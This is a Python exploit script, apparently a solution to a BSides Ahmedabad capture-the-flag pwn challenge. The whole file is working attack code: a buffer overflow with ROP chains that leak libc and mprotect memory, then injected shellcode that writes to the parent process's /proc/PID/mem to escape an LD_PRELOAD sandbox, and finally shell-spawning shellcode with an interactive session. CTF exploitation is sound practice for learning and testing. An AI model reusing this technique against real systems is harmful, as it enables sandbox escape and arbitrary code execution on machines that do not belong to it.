#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './vuln'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'set follow-fork-mode parent', 'env':{'LD_PRELOAD':'./libsandbox.so'}}, \
                        local   = {'argv':[bin_file], 'env':{'LD_PRELOAD':'./libsandbox.so'}}, \
                        remote  = {'host':'pwn2.bsidesahmedabad.in', 'port':9002})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.31.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_pust       = binf.got['puts']
addr_main           = binf.sep_function['main']
addr_bss            = binf.sep_section['.bss']
addr_buf            = addr_bss + 0x100

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts        = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    rop1 = ROP(binf)
    rop1.puts(addr_got_pust)
    rop1.main()

    exploit  = b'a'*0x48
    exploit += bytes(rop1)
    conn.sendlineafter(': \n', exploit)

    conn.recvuntil('Thank you!\n')
    addr_libc_puts = u(conn.recvline(keepends=False))
    libc.address = addr_libc_puts - offset_libc_puts
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_sprintf   = libc.sep_function['sprintf']
    addr_libc_puts      = libc.sep_function['puts']

    rop2 = ROP(libc)
    rop2.rdi.address = rop1.rdi.address
    rop2.mprotect(0x00400000, 0x1000, constants.PROT_EXEC|constants.PROT_READ|constants.PROT_WRITE)
    rop2.read(constants.STDIN_FILENO, 0x00400000, 0x1000)
    rop2.call(0x00400000)

    exploit  = b'b'*0x48
    exploit += bytes(rop2)
    conn.sendlineafter(': \n', exploit)

    args = {'sprintf':addr_libc_sprintf, 'fmt':0x4000a0, 'path':addr_buf}

    shellasm  = shellcraft.getpid()
    shellasm += '''
    mov rdi, {path}
    mov rsi, {fmt}
    mov rdx, rax
    inc rdx
    mov rcx, {sprintf}
    call rcx
    '''.format(**args)
    shellasm += shellcraft.creat(addr_buf, 0)
    shellasm += 'mov rbp, rax'
    shellasm += shellcraft.lseek('rbp', addr_libc_puts, 'SEEK_SET')
    shellasm += shellcraft.read('STDIN_FILENO', addr_buf, 0x100)
    shellasm += shellcraft.write('rbp', addr_buf, 'rax')
    shellasm += shellcraft.exit(0)

    exploit  = asm(shellasm).ljust(0xa0, b'\xcc')
    exploit += b'/proc/%d/mem\x00'
    conn.send(exploit)

    conn.send(asm(shellcraft.sh()))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # Neko{Why_1s_p4r3nt_pl4y1ng_1n_s4ndb0x?}

if __name__=='__main__':
    main()

#==========
